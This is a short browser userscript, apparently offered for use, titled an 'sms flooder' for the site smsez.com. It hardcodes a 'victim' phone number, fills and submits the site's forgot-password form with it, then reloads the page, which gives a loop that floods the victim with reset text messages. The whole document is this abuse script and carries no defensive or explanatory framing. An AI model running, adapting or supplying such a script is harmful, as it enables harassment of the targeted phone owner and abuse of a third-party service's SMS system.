// ==UserScript==
// @name          Anonymous SMSEZ sms flooder
// @namespace     SUNNY020
// @description   flooder sms
// @include       http://*smsez.com/*
// ==/UserScript==

var victim=8092262928//Enter victims number here

if(document.location=="http://www.smsez.com/forgot-password.php"||document.location=="http://www.smsez.com/forgot-password.php")
{
document.forms[1].elements[0].value=victim;
document.forms[1].submit();
}
if(document.location=="http://www.smsez.com/forgot-password.php"||document.location=="http://www.smsez.com/forgot-password.php")
document.location='http://www.smsez.com/forgot-password.php';